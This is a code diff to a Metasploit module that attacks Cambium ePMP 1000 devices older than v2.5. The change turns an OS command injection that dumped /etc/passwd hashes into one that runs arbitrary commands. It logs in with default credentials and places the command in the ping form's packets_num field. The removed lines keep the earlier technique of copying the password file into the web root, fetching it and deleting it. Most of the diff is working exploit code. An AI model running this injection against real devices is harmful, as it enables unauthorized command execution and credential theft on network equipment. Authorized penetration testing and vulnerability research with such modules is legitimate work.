@@ -8,12 +8,12 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name' => "Cambium ePMP 1000 'ping' Password Hash Extractor (up to v2.5)",
+      'Name' => "Cambium ePMP 1000 'ping' Command Injection (up to v2.5)",
       'Description' => %{
           This module exploits an OS Command Injection vulnerability in Cambium
           ePMP 1000 (<v2.5) device management portal. It requires any one of the
           following login credentials - admin/admin, installer/installer, home/home - to
-          dump system hashes.
+          execute arbitrary system commands.
       },
       'References' =>
         [
@@ -32,7 +32,8 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(80),	# Application may run on a different port too. Change port accordingly.
         OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'installer']),
-        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'installer'])
+        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'installer']),
+        OptString.new('CMD', [true, 'Command(s) to run', 'id; pwd'])
       ], self.class
     )
 
@@ -46,12 +47,12 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   # Command Execution
-  def hash_dump(config_uri, cookie)
-    random_filename = Rex::Text::rand_text_alpha(8)
-    command = 'cp /etc/passwd /www/' + random_filename
+  def cmd_exec(config_uri, cookie)
+    command = datastore['CMD']
     inject = '|' + "#{command}" + ' ||'
     clean_inject = CGI.unescapeHTML(inject.to_s)
 
+    print_status("#{rhost}:#{rport} - Executing #{command}")
     res = send_request_cgi(
       {
         'method' => 'POST',
@@ -82,73 +83,15 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     if good_response
-      # retrieve passwd file
-      res = send_request_cgi(
-        {
-          'method' => 'GET',
-          'uri' => '/' + random_filename,
-          'cookie' => cookie,
-          'headers' => {
-            'Accept' => '*/*',
-            'Accept-Language' => 'en-US,en;q=0.5',
-            'Accept-Encoding' => 'gzip, deflate',
-            'X-Requested-With' => 'XMLHttpRequest',
-            'ctype' => 'application/x-www-form-urlencoded; charset=UTF-8',
-            'Connection' => 'close'
-          }
-        }, 25
-      )
-
-      good_response = (
-        res &&
-        res.code == 200 && res.body =~ /root/
-      )
-
-      if good_response
-        print_status("#{rhost}:#{rport} - Dumping password hashes")
-
-        path = store_loot('ePMP_passwd', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 password hashes')
-        print_status("#{rhost}:#{rport} - Hashes saved in: #{path}")
-
-        # clean up the passwd file from /www/
-        command = 'rm /www/' + random_filename
-        inject = '|' + "#{command}" + ' ||'
-        clean_inject = CGI.unescapeHTML(inject.to_s)
-
-        res = send_request_cgi(
-          {
-            'uri' => config_uri,
-            'method' => 'POST',
-            'cookie' => cookie,
-            'headers' => {
-              'Accept' => '*/*',
-              'Accept-Language' => 'en-US,en;q=0.5',
-              'Accept-Encoding' => 'gzip, deflate',
-              'X-Requested-With' => 'XMLHttpRequest',
-              'ctype' => '*/*',
-              'Connection' => 'close'
-            },
-            'vars_post' =>
-              {
-                'ping_ip' => '127.0.0.1', # This parameter can also be used for injection
-                'packets_num' => clean_inject,
-                'buf_size' => 0,
-                'ttl' => 1,
-                'debug' => '0'
-              }
-          }
-        )
-      else
-        check_file_uri = "#{(ssl ? 'https' : 'http')}" + '://' + "#{rhost}:#{rport}" + '/' + random_filename
-        print_error("#{rhost}:#{rport} - Could not retrieve hashes. Try manually by directly accessing #{check_file_uri}.")
-      end
+      path = store_loot('ePMP_cmd_exec', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 Command Exec Results')
+      print_status("#{rhost}:#{rport} - Results saved in: #{path}")
     else
-      print_error("#{rhost}:#{rport} - Failed to dump hashes.")
+      print_error("#{rhost}:#{rport} - Failed to execute command(s).")
     end
   end
 
   #
-  # Login & initiate Password Hash dump
+  # Login & initiate cmd_exec
   #
 
   def do_login(epmp_ver)
@@ -157,7 +100,7 @@ class MetasploitModule < Msf::Auxiliary
       if cookie == 'skip' && config_uri_ping == 'skip'
         return
       else
-        hash_dump(config_uri_ping, cookie)
+        cmd_exec(config_uri_ping, cookie)
       end
     else
       print_error('This ePMP version is not vulnerable. Module will not continue.')
